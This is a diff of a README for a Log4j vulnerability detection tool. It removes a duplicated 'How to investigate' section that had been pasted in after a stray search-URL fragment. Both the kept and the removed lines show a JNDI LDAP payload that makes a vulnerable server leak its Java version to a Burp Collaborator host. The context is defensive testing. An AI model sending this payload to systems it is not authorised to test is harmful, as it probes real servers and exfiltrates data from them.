@@ -20,16 +20,6 @@ ${jndi:ldap://${sys:java.version}.urlFromBurpCollaborator}
 ![img.png](images/5.png)
 
 And then we can get the dns result which contains the java version from Burp Collaborator Client which means the log4j vuln exists.
-![img.png](images/6.png) - Google URL: http://www.google.com/search?q=### How to investigate:
-
-For example, the tool told us header User-Agent can lead to log4j vul.
-![img.png](images/4.png)
-
-We can then use below payload to test it.
-${jndi:ldap://${sys:java.version}.urlFromBurpCollaborator}
-![img.png](images/5.png)
-
-And then we can get the dns result which contains the java version from Burp Collaborator Client which means the log4j vuln exists.
 ![img.png](images/6.png)
 
 ### What it supports:
